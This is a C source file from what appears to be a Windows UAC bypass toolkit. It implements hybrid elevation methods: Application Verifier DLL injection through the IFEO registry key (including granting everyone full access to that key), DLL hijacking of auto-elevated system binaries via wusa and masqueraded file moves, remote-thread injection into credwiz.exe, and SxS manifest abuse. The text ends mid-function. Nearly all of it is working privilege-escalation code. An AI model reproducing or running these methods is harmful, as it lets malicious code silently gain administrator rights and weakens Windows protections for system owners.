/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2017
*
*  TITLE:       HYBRIDS.C
*
*  VERSION:     2.71
*
*  DATE:        06 May 2017
*
*  Hybrid UAC bypass methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "makecab.h"
#include "manifest.h"

ELOAD_PARAMETERS_SIREFEF g_ElevParamsSirefef;

/*
* ucmAvrfMethod
*
* Purpose:
*
* Acquire elevation through Application Verifier dll injection.
*
*/
BOOL ucmAvrfMethod(
    CONST PVOID AvrfDll,
    DWORD AvrfDllSize
)
{
    BOOL bResult = FALSE, cond = FALSE;
    HKEY hKey = NULL, hSubKey = NULL;
    LRESULT lRet;
    DWORD dwValue = 0x100; // FLG_APPLICATION_VERIFIER;
    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szSourceDll[MAX_PATH * 2];

    UNICODE_STRING ustr;
    OBJECT_ATTRIBUTES obja;

    if (
        (AvrfDll == NULL) ||
        (AvrfDllSize == 0)
        )
    {
        return bResult;
    }

    do {

        //
        // Extract file to the protected directory.
        // First, create cab with fake msu ext, second run fusion process.
        //
        RtlSecureZeroMemory(szSourceDll, sizeof(szSourceDll));
        _strcpy(szSourceDll, g_ctx.szTempDirectory);
        _strcat(szSourceDll, HIBIKI_DLL);
        if (!ucmCreateCabinetForSingleFile(szSourceDll, AvrfDll, AvrfDllSize))
            break;

        // Drop Hibiki to system32
        if (!ucmWusaExtractPackage(g_ctx.szSystemDirectory))
            break;

        //
        // Set new key security DACL.
        // Red Alert: manually restore IFEO key permissions after using this tool, as they are not inherited.
        //
        if (!ucmMasqueradedAlterObjectSecurityCOM(
            T_IFEO,
            DACL_SECURITY_INFORMATION,
            SE_REGISTRY_KEY,
            T_SDDL_ALL_FOR_EVERYONE)) break;

        //
        // Open IFEO key.
        //
        RtlSecureZeroMemory(&ustr, sizeof(ustr));
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, L"\\REGISTRY\\");
        _strcat(szBuffer, T_IFEO);
        RtlInitUnicodeString(&ustr, szBuffer);
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (!NT_SUCCESS(NtOpenKey(&hKey, MAXIMUM_ALLOWED, &obja)))
            break;

        //
        // Create application key.
        // 
        hSubKey = NULL;
        lRet = RegCreateKey(hKey, CLICONFG_EXE, &hSubKey);
        if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS))
            break;

        //
        // Set verifier flag value.
        //
        lRet = RegSetValueEx(hSubKey, TEXT("GlobalFlag"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        if (lRet != ERROR_SUCCESS)
            break;

        //
        // Set verifier dll value.
        // 
        dwValue = (DWORD)((1 + _strlen(HIBIKI_DLL)) * sizeof(WCHAR));
        lRet = RegSetValueEx(hSubKey, TEXT("VerifierDlls"), 0, REG_SZ, (BYTE*)&HIBIKI_DLL, dwValue);
        if (lRet != ERROR_SUCCESS)
            break;

        //
        // Cleanup registry, we don't need anymore.
        //
        RegCloseKey(hSubKey);
        hSubKey = NULL;
        NtClose(hKey);
        hKey = NULL;

        //
        // Extract file to the protected directory.
        // First, create cab with fake msu ext, second run fusion process.
        //
        RtlSecureZeroMemory(szSourceDll, sizeof(szSourceDll));
        _strcpy(szSourceDll, g_ctx.szTempDirectory);
        _strcat(szSourceDll, HIBIKI_DLL);
        if (!ucmCreateCabinetForSingleFile(szSourceDll, AvrfDll, AvrfDllSize))
            break;

        // Drop Hibiki to system32
        if (!ucmWusaExtractPackage(g_ctx.szSystemDirectory))
            break;

        // Finally run target fusion process.
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx.szSystemDirectory);
        _strcat(szBuffer, CLICONFG_EXE);
        bResult = supRunProcess(szBuffer, NULL);

    } while (cond);

    if (hKey != NULL) {
        NtClose(hKey);
    }
    if (hSubKey != NULL) {
        RegCloseKey(hSubKey);
    }
    return bResult;
}

/*
* ucmWinSATMethod
*
* Purpose:
*
* Acquire elevation through abusing APPINFO.DLL whitelisting model logic and wusa installer/IFileOperation autoelevation.
* Slightly modified target and proxydll can work almost with every autoelevated/whitelisted application.
* This method uses advantage of wusa to write to the protected folders, but can be adapted to IFileOperation too.
* WinSAT used for demonstration purposes only.
*
*/
BOOL ucmWinSATMethod(
    LPWSTR lpTargetDll,
    PVOID ProxyDll,
    DWORD ProxyDllSize,
    BOOL UseWusa
)
{
    BOOL bResult = FALSE, cond = FALSE;
    CABDATA *Cabinet = NULL;
    WCHAR szSource[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];
    WCHAR szBuffer[MAX_PATH * 2];

    if (
        (ProxyDll == NULL) ||
        (ProxyDllSize == 0) ||
        (lpTargetDll == NULL)
        )
    {
        return bResult;
    }

    if (_strlen(lpTargetDll) > 100) {
        return bResult;
    }

    RtlSecureZeroMemory(szSource, sizeof(szSource));
    RtlSecureZeroMemory(szDest, sizeof(szDest));

    do {

        _strcpy(szSource, g_ctx.szSystemDirectory);
        _strcat(szSource, WINSAT_EXE);

        _strcpy(szDest, g_ctx.szTempDirectory);
        _strcat(szDest, WINSAT_EXE);

        // Copy winsat to temp directory
        if (!CopyFile(szSource, szDest, FALSE)) {
            supDebugPrint(TEXT("ucmWinSATMethod"), GetLastError());
            break;
        }

        //put target dll
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, lpTargetDll);

        //write proxy dll to disk
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        //
        // Two options: use wusa installer or IFileOperation
        //
        if (UseWusa) {

            //build cabinet
            _strcpy(szBuffer, g_ctx.szTempDirectory);
            _strcat(szBuffer, ELLOCNAK_MSU);

            Cabinet = cabCreate(szBuffer);
            if (Cabinet) {

                _strcpy(szDest, g_ctx.szTempDirectory);
                _strcat(szDest, WINSAT_EXE);

                //put proxy dll inside cabinet
                cabAddFile(Cabinet, szSource, lpTargetDll);

                //put winsat.exe
                cabAddFile(Cabinet, szDest, WINSAT_EXE);
                cabClose(Cabinet);
                Cabinet = NULL;
            }
            else {
                break;
            }

            //extract package
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            _strcpy(szBuffer, g_ctx.szSystemDirectory);
            _strcat(szBuffer, SYSPREP_DIR);
            bResult = ucmWusaExtractPackage(szBuffer);
        }
        else {

            //wusa extract banned, switch to IFileOperation.
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            _strcpy(szBuffer, g_ctx.szSystemDirectory);
            _strcat(szBuffer, SYSPREP_DIR);

            bResult = ucmMasqueradedMoveFileCOM(szSource, szBuffer);
            if (!bResult) {
                break;
            }
            bResult = ucmMasqueradedMoveFileCOM(szDest, szBuffer);
            if (!bResult) {
                break;
            }
        }

    } while (cond);

    if (bResult) {

        //run winsat
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx.szSystemDirectory);
        _strcat(szBuffer, SYSPREP_DIR);
        _strcat(szBuffer, WINSAT_EXE);

        bResult = supRunProcess(szBuffer, NULL);
        //cleanup of the above files must be done by payload code
    }

    if (Cabinet) {
        cabClose(Cabinet);
    }
    //remove trash from %temp%
    if (szDest[0] != 0) {
        DeleteFileW(szDest);
    }
    if (szSource[0] != 0) {
        DeleteFileW(szSource);
    }

    return bResult;
}

/*
* ucmMMCMethod
*
* Purpose:
*
* Bypass UAC by abusing MMC.exe backdoor hardcoded in appinfo.dll
*
*/
BOOL ucmMMCMethod(
    UCM_METHOD Method,
    LPWSTR lpTargetDll,
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE, cond = FALSE;
    LPWSTR lpMscFile = NULL;
    WCHAR szSource[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];

    if ((ProxyDll == NULL) || (ProxyDllSize == 0) || (lpTargetDll == NULL)) {
        return bResult;
    }

    if (_strlen(lpTargetDll) > 100) {
        return bResult;
    }

    do {

        //check if file exists (like on srv for example)
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);

        switch (Method) {
        case UacMethodMMC2:
            _strcat(szDest, WBEM_DIR);
            break;
        default:
            break;
        }

        _strcat(szDest, lpTargetDll);

        if (PathFileExists(szDest)) {
            supDebugPrint(TEXT("ucmMMCMethod"), ERROR_ALREADY_EXISTS);
            break;
        }

        //target dir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);

        switch (Method) {

        case UacMethodMMC2:
            _strcat(szDest, WBEM_DIR);
            lpMscFile = RSOP_MSC;
            break;

        default:
            lpMscFile = EVENTVWR_MSC;
            break;
        }

        //put target dll
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, lpTargetDll);

        //write proxy dll to disk
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        //move proxy dll to target directory
        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        //run mmc console
        //because of mmc harcoded backdoor uac will autoelevate mmc with valid and trusted MS command.
        //yuubari identified multiple exploits in msc commands loading scheme.
        bResult = supRunProcess(MMC_EXE, lpMscFile);

    } while (cond);

    return bResult;
}

/*
* ucmElevatedLaunchProc
*
* Purpose:
*
* Elevation procedure used by Sirefef method
*
*/
DWORD WINAPI ucmElevatedLaunchProc(
    ELOAD_PARAMETERS_SIREFEF *elvpar
)
{
    SHELLEXECUTEINFOW   shexec;

    if (elvpar == NULL)
        return (DWORD)E_FAIL;

    shexec.cbSize = sizeof(shexec);
    shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
    shexec.nShow = SW_SHOW;
    shexec.lpVerb = elvpar->szVerb;
    shexec.lpFile = elvpar->szTargetApp;
    shexec.lpParameters = NULL;
    shexec.lpDirectory = NULL;
    if (elvpar->xShellExecuteExW(&shexec))
        if (shexec.hProcess != NULL) {
            elvpar->xWaitForSingleObject(shexec.hProcess, INFINITE);
            elvpar->xCloseHandle(shexec.hProcess);
        }

    return S_OK;
}

/*
* ucmSirefefBuildControlContext
*
* Purpose:
*
* Preparations for Sirefef method.
*
*/
PZA_CONTROL_CONTEXT ucmSirefefBuildControlContext(
    VOID
)
{
    BOOL                bCond = FALSE, bSuccess = FALSE;
    ZA_CONTROL_CONTEXT *ctx = NULL;
    SIZE_T              sz;
    PVOID               Routine;


    do {
        sz = sizeof(ZA_CONTROL_CONTEXT);
        NtAllocateVirtualMemory(NtCurrentProcess(), &ctx, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (ctx == NULL)
            break;

        RtlSecureZeroMemory(ctx, sz);

        Routine = supNativeGetProcAddress(KERNEL32_DLL, "CopyFileW");
        if (Routine == NULL)
            break;
        ctx->pCopyFileW = RtlEncodePointer(Routine);

        Routine = supNativeGetProcAddress(KERNEL32_DLL, "CreateRemoteThread");
        if (Routine == NULL)
            break;
        ctx->pCreateRemoteThread = RtlEncodePointer(Routine);

        Routine = supNativeGetProcAddress(KERNEL32_DLL, "WaitForSingleObject");
        if (Routine == NULL)
            break;
        ctx->pWaitForSingleObject = RtlEncodePointer(Routine);

        Routine = supNativeGetProcAddress(KERNEL32_DLL, "WriteProcessMemory");
        if (Routine == NULL)
            break;
        ctx->pWriteProcessMemory = RtlEncodePointer(Routine);

        Routine = supNativeGetProcAddress(NTDLL_DLL, "NtClose");
        if (Routine == NULL)
            break;
        ctx->pNtClose = RtlEncodePointer(Routine);

        Routine = supNativeGetProcAddress(NTDLL_DLL, "NtAllocateVirtualMemory");
        if (Routine == NULL)
            break;
        ctx->pNtAllocateVirtualMemory = RtlEncodePointer(Routine);

        Routine = supNativeGetProcAddress(NTDLL_DLL, "NtTerminateProcess");
        if (Routine == NULL)
            break;
        ctx->pNtTerminateProcess = RtlEncodePointer(Routine);

        ctx->SfCopyFile = RtlEncodePointer(ucmMasqueradedMoveFileCOM);
        ctx->ElevatedProcedure = RtlEncodePointer(ucmElevatedLaunchProc);

        ctx->ElevatedParameters = &g_ElevParamsSirefef;

        ctx->RunProcessEx = RtlEncodePointer(supRunProcessEx);
        bSuccess = TRUE;

    } while (bCond);

    if (bSuccess == FALSE) {
        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &ctx, &sz, MEM_RELEASE);
    }

    return ctx;
}

/*
* ucmSirefefMethod
*
* Purpose:
*
* Bypass UAC by abusing OOBE.exe backdoor hardcoded in appinfo.dll
*
*/
BOOL ucmSirefefMethod(
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL                      bResult = FALSE, bCond = FALSE;
    ZA_CONTROL_CONTEXT       *za_ctx = NULL;
    SIZE_T                    sz;
    DWORD                     c;

    HANDLE                    hProcess = NULL, hRemoteThread = NULL;

    HINSTANCE                 selfmodule = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER         pdosh = (PIMAGE_DOS_HEADER)selfmodule;
    PIMAGE_FILE_HEADER        fh = (PIMAGE_FILE_HEADER)((char *)pdosh + pdosh->e_lfanew + sizeof(DWORD));
    PIMAGE_OPTIONAL_HEADER    opth = (PIMAGE_OPTIONAL_HEADER)((char *)fh + sizeof(IMAGE_FILE_HEADER));
    LPVOID                    remotebuffer = NULL, newEp, newDp;

    if (
        (ProxyDll == NULL) ||
        (ProxyDllSize == 0)
        )
    {
        return bResult;
    }

    do {
        za_ctx = ucmSirefefBuildControlContext();
        if (za_ctx == NULL)
            break;

        //put Fubuki dll as netutils to %temp%
        _strcpy(za_ctx->szSource, g_ctx.szTempDirectory);
        _strcat(za_ctx->szSource, NETUTILS_DLL);
        if (!supWriteBufferToFile(za_ctx->szSource, ProxyDll, ProxyDllSize))
            break;

        //move dll to wbem target folder
        _strcpy(za_ctx->szBuffer, g_ctx.szSystemDirectory);
        _strcat(za_ctx->szBuffer, WBEM_DIR);
        za_ctx->SfCopyFile = RtlDecodePointer(za_ctx->SfCopyFile);
        bResult = za_ctx->SfCopyFile(za_ctx->szSource, za_ctx->szBuffer);
        if (!bResult)
            break;

        //copy 1st stage target process
        RtlSecureZeroMemory(za_ctx->szSource, sizeof(za_ctx->szSource));
        _strcpy(za_ctx->szSource, g_ctx.szSystemDirectory);
        _strcat(za_ctx->szSource, CREDWIZ_EXE);

        RtlSecureZeroMemory(za_ctx->szDest, sizeof(za_ctx->szDest));
        _strcpy(za_ctx->szDest, g_ctx.szTempDirectory);
        _strcat(za_ctx->szDest, OOBE_EXE);
        za_ctx->pCopyFileW = RtlDecodePointer(za_ctx->pCopyFileW);
        if (!za_ctx->pCopyFileW(za_ctx->szSource, za_ctx->szDest, FALSE))
            break;

        bResult = za_ctx->SfCopyFile(za_ctx->szDest, za_ctx->szBuffer);
        if (!bResult)
            break;

        //setup basic shellcode routines
        za_ctx->pWaitForSingleObject = RtlDecodePointer(za_ctx->pWaitForSingleObject);
        za_ctx->ElevatedParameters->xShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(g_ctx.hShell32, "ShellExecuteExW");
        za_ctx->ElevatedParameters->xWaitForSingleObject = (pfnWaitForSingleObject)za_ctx->pWaitForSingleObject;
        za_ctx->pNtClose = RtlDecodePointer(za_ctx->pNtClose);
        za_ctx->ElevatedParameters->xCloseHandle = (pfnCloseHandle)za_ctx->pNtClose;

        //set shellcode 2nd stage target process
        //c:\windows\system32\wbem\oobe.exe
        RtlSecureZeroMemory(za_ctx->szBuffer, sizeof(za_ctx->szBuffer));
        _strcpy(za_ctx->szBuffer, g_ctx.szSystemDirectory);
        _strcat(za_ctx->szBuffer, WBEM_DIR);
        _strcat(za_ctx->szBuffer, OOBE_EXE);
        _strcpy(za_ctx->ElevatedParameters->szTargetApp, za_ctx->szBuffer);
        _strcpy(za_ctx->ElevatedParameters->szVerb, RUNAS_VERB);

        RtlSecureZeroMemory(za_ctx->szBuffer, sizeof(za_ctx->szBuffer));

        _strcpy(za_ctx->szBuffer, g_ctx.szSystemDirectory); //c:\windows\system32\credwiz.exe
        _strcat(za_ctx->szBuffer, CREDWIZ_EXE);

        //run 1st stage target process
        za_ctx->RunProcessEx = RtlDecodePointer(za_ctx->RunProcessEx);
        hProcess = za_ctx->RunProcessEx(za_ctx->szBuffer, NULL, NULL, NULL);
        if (hProcess == NULL)
            break;

        za_ctx->pNtAllocateVirtualMemory = RtlDecodePointer(za_ctx->pNtAllocateVirtualMemory);

        sz = (SIZE_T)opth->SizeOfImage;
        za_ctx->pNtAllocateVirtualMemory(hProcess, &remotebuffer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (remotebuffer == NULL)
            break;

        za_ctx->pWriteProcessMemory = RtlDecodePointer(za_ctx->pWriteProcessMemory);
        if (!za_ctx->pWriteProcessMemory(hProcess, remotebuffer, selfmodule, opth->SizeOfImage, &sz))
            break;

        za_ctx->ElevatedProcedure = RtlDecodePointer(za_ctx->ElevatedProcedure);

        newEp = (char *)remotebuffer + ((char *)za_ctx->ElevatedProcedure - (char *)selfmodule);
        newDp = (char *)remotebuffer + ((char *)za_ctx->ElevatedParameters - (char *)selfmodule);

        za_ctx->pCreateRemoteThread = RtlDecodePointer(za_ctx->pCreateRemoteThread);

        hRemoteThread = za_ctx->pCreateRemoteThread(hProcess, NULL, 0, newEp, newDp, 0, &c);
        if (hRemoteThread) {
            za_ctx->pWaitForSingleObject(hRemoteThread, INFINITE);
            za_ctx->pNtClose(hRemoteThread);
            bResult = TRUE;
        }

    } while (bCond);

    if (za_ctx != NULL) {
        if (hProcess != NULL) {
            za_ctx->pNtTerminateProcess = RtlDecodePointer(za_ctx->pNtTerminateProcess);
            za_ctx->pNtTerminateProcess(hProcess, 0);
            za_ctx->pNtClose(hProcess); //NtClose already decoded
        }

        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &za_ctx, &sz, MEM_RELEASE);
    }

    return bResult;
}

/*
* ucmGenericAutoelevation
*
* Purpose:
*
* Bypass UAC by abusing target autoelevated system32 application via missing system32 dll
*
*/
BOOL ucmGenericAutoelevation(
    LPWSTR lpTargetApp,
    LPWSTR lpTargetDll,
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE, cond = FALSE;
    WCHAR szSource[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];

    if (
        (ProxyDll == NULL) ||
        (ProxyDllSize == 0) ||
        (lpTargetApp == NULL) ||
        (lpTargetDll == NULL)
        )
    {
        return bResult;
    }

    if (_strlen(lpTargetDll) > 100) {
        return bResult;
    }

    do {

        //put target dll
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, lpTargetDll);

        //write proxy dll to disk
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        //target dir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);

        //drop payload to system32
        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        //run target app
        bResult = supRunProcess(lpTargetApp, NULL);

    } while (cond);

    return bResult;
}

/*
* ucmGWX
*
* Purpose:
*
* Bypass UAC by abusing newly added appinfo.dll backdoor.
* IIS initially not installed in Windows client, but appinfo.dll whitelists IIS application as autoelevated.
* We will use backdoor from "Get Windows 10" bullshit marketing promo package and exploit it with dll hijacking as usual.
*
* Since this method very out-dated (GWX program expired long time ago) starting from 2.5.6 Kongou module removed from program resources.
* To use it again place KongouXX.cd to the program directory, where XX is platform (32 or 64).
* Kongou located in project "bin" directory in encrypted and compressed state, Akagi will load, decrypt and decompress it.
*
*/
BOOL ucmGWX(
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL   bResult = FALSE, cond = FALSE;
    SIZE_T Dummy;
    WCHAR  szDest[MAX_PATH * 2];
    WCHAR  szSource[MAX_PATH * 2];
    WCHAR  szTargetApp[MAX_PATH * 2];

    PVOID Data = NULL, Ptr = NULL;
    ULONG DecompressedBufferSize = 0, DataSize = 0;

    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
        return FALSE;

    do {

        //target dir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);
        _strcat(szDest, INETSRV_DIR);
        _strcat(szDest, INETMGR_EXE);

        //File already exist, so IIS could be installed
        if (PathFileExists(szDest)) {
            supDebugPrint(TEXT("ucmGWX"), ERROR_ALREADY_EXISTS);
            break;
        }

        //summon some unicorns, kongouXX.cd expected to be in the same directory as application
        Ptr = supReadFileToBuffer(KONGOU_CD, &DataSize);
        if (Ptr == NULL) {
            supDebugPrint(TEXT("ucmGWX"), ERROR_FILE_NOT_FOUND);
            break;
        }

        Data = DecompressPayload(Ptr, DataSize, &DecompressedBufferSize);
        if (Data == NULL)
            break;

        //write proxy dll to disk
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, SLC_DLL);
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize))
            break;

        //drop fubuki to system32\inetsrv
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);
        _strcat(szDest, INETSRV_DIR);
        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        //put target app
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, INETMGR_EXE);

        //write app to disk
        if (!supWriteBufferToFile(szSource, Data, DecompressedBufferSize)) {
            break;
        }

        //drop InetMgr.exe to system32\inetsrv
        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        _strcpy(szTargetApp, szDest);
        _strcat(szTargetApp, INETMGR_EXE);
        bResult = supRunProcess(szTargetApp, NULL);

    } while (cond);

    if (Data != NULL) {
        Dummy = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &Data, &Dummy, MEM_RELEASE);
    }

    if (Ptr != NULL) {
        Dummy = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &Ptr, &Dummy, MEM_RELEASE);
    }
    return bResult;
}

/*
* ucmAutoElevateManifestDropDll
*
* Purpose:
*
* Drop target dll for ucmAutoElevateManifest.
*
*/
BOOL ucmAutoElevateManifestDropDll(
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    WCHAR szDest[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];

    RtlSecureZeroMemory(szSource, sizeof(szSource));
    _strcpy(szSource, g_ctx.szTempDirectory);
    _strcat(szSource, CRYPTBASE_DLL);
    if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
        return FALSE;
    }
    RtlSecureZeroMemory(szDest, sizeof(szDest));
    _strcpy(szDest, g_ctx.szSystemDirectory);
    _strcat(szDest, SYSPREP_DIR);
    return ucmMasqueradedMoveFileCOM(szSource, szDest);
}

/*
* ucmAutoElevateManifestW7
*
* Purpose:
*
* Special case for Windows 7.
*
*/
BOOL ucmAutoElevateManifestW7(
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE, bCond = FALSE;
    WCHAR szDest[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];
    LPWSTR lpApplication = NULL;

    do {

        RtlSecureZeroMemory(szSource, sizeof(szSource));
        RtlSecureZeroMemory(szDest, sizeof(szDest));

        _strcpy(szSource, g_ctx.szSystemDirectory);
        _strcpy(szDest, g_ctx.szTempDirectory);


        lpApplication = TASKHOST_EXE;//doesn't really matter, Yuubari module lists multiple targets
        _strcat(szSource, lpApplication);
        _strcat(szDest, lpApplication);

        // Copy target to temp directory
        if (!CopyFile(szSource, szDest, FALSE)) {
            supDebugPrint(TEXT("ucmAutoElevateManifestW7"), ERROR_FILE_NOT_FOUND);
            break;
        }
        _strcpy(szSource, szDest);

        // Copy target app to windir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szDest, TEXT("\\"));
        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        bResult = ucmAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
        if (!bResult) {
            break;
        }

        //put target manifest
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, lpApplication);
        _strcat(szSource, MANIFEST_EXT);
        if (!supWriteBufferToFile(szSource, (PVOID)ManifestData, sizeof(ManifestData))) {
            break;
        }

        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, USER_SHARED_DATA->NtSystemRoot);
        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        _strcat(szDest, L"\\");
        _strcat(szDest, lpApplication);
        bResult = supRunProcess(szDest, NULL);

    } while (bCond);

    return bResult;
}

/*
* ucmAutoElevateManifest
*
* Purpose:
*
* Bypass UAC by abusing appinfo whitelist and SXS undocumented feature.
* Ironically revealed by Microsoft itself in their attempt to fix UAC exploit.
* Supported at Windows 7 minimum (older versions not checked).
*
*/
BOOL ucmAutoElevateManifest(
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE, bCond = FALSE;
    WCHAR szDest[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];
    LPWSTR lpApplication = NULL;

    if ((ProxyDll == NULL) || (ProxyDllSize == 0))
        return bResult;

    do {

        if (g_ctx.dwBuildNumber < 9600) {
            bResult = ucmAutoElevateManifestW7(ProxyDll, ProxyDllSize);
            break;
        }

        RtlSecureZeroMemory(szSource, sizeof(szSource));
        RtlSecureZeroMemory(szDest, sizeof(szDest));

        _strcpy(szSource, g_ctx.szSystemDirectory);
        _strcpy(szDest, g_ctx.szTempDirectory);
        _strcat(szSource, TZSYNC_EXE); //doesn't really matter, Yuubari module lists multiple targets
        lpApplication = MIGWIZ_EXE;
        _strcat(szDest, lpApplication);

        // Copy target to temp directory
        if (!CopyFile(szSource, szDest, FALSE)) {
            supDebugPrint(TEXT("ucmAutoElevateManifest"), ERROR_FILE_NOT_FOUND);
            break;
        }
        _strcpy(szSource, szDest);

        // Copy target app to home
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);
        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        bResult = ucmAutoElevateManifestDropDll(ProxyDll, ProxyDllSize);
        if (!bResult) {
            break;
        }

        //put target manifest
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx.szTempDirectory);
        _strcat(szSource, lpApplication);
        _strcat(szSource, MANIFEST_EXT);
        if (!supWriteBufferToFile(szSource, (PVOID)ManifestData, sizeof(ManifestData))) {
            break;
        }
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx.szSystemDirectory);
        bResult = ucmMasqueradedMoveFileCOM(szSource, szDest);
        if (!bResult) {
            break;
        }

        _strcpy(szDest, g_ctx.szSystemDirectory);
        _strcat(szDest, lpApplication);
        bResult = supRunProcess(szDest, NULL);

    } while (bCond);

    return bResult;
}

/*
* ucmInetMgrFindCallback
*
* Purpose:
*
* File search callback which does all the magic.
*
*/
BOOL ucmInetMgrFindCallback(
    WIN32_FIND_DATA *fdata,
    LPWSTR lpDirectory,
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL            bCond = FALSE, bSuccess = FALSE;
    SIZE_T          l = 0;
    HANDLE          hFile = INVALID_HANDLE_VALUE, hFileMapping = NULL;
    PDWORD          MappedFile = NULL;
    LARGE_INTEGER   FileSize;
    CFILE_TYPE      ft;

    PVOID           OutputBuffer = NULL;
    SIZE_T          OutputBufferSize = 0;

    WCHAR textbuf[MAX_PATH * 4];
    WCHAR szDest[MAX_PATH * 2];

    if (lpDirectory == NULL)
        return FALSE;

    do {
        if (fdata->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            break;

        if (_strcmpi(fdata->cFileName, INETMGR_EXE) != 0)
            break;

        RtlSecureZeroMemory(&textbuf, sizeof(textbuf));
        _strcpy(textbuf, lpDirectory);

        l = _strlen(textbuf);
        if (textbuf[l - 1] != L'\\') {
            textbuf[l] = L'\\';
            textbuf[l + 1] = 0;
        }
        _strcat(textbuf, fdata->cFileName);

        hFile = CreateFile(textbuf, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
            break;

        FileSize.QuadPart = 0;
        if (!GetFileSizeEx(hFile, &FileSize))
            break;

        if (FileSize.QuadPart < 8)
            break;

        hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
        if (hFileMapping == NULL)
            break;

        MappedFile = MapViewOfFile(hFileMapping, PAGE_READWRITE, 0, 0, 0);
        if (MappedFile == NULL)
            break;

        ft = GetTargetFileType(MappedFile);
